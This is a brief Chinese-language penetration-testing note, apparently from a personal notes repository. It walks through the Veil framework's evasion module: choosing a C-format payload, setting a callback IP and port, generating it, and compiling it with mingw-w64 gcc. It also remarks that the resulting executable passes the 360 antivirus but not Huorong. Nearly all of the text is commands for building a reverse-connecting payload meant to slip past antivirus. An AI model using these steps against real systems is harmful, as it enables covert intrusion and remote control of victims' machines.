	>use 1选择evasion模块
	>list查看可用payload
	>use 7 选择c格式的payload
	>set LHOST/LPORT设置回连IP和端口
	>generate生成
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/77.png)

	直接生成的exe可能会被查杀，目前可过360，不能过火绒
	使用minGW-w64编译C文件
	>gcc -o vel.exe veil.c -l ws2_32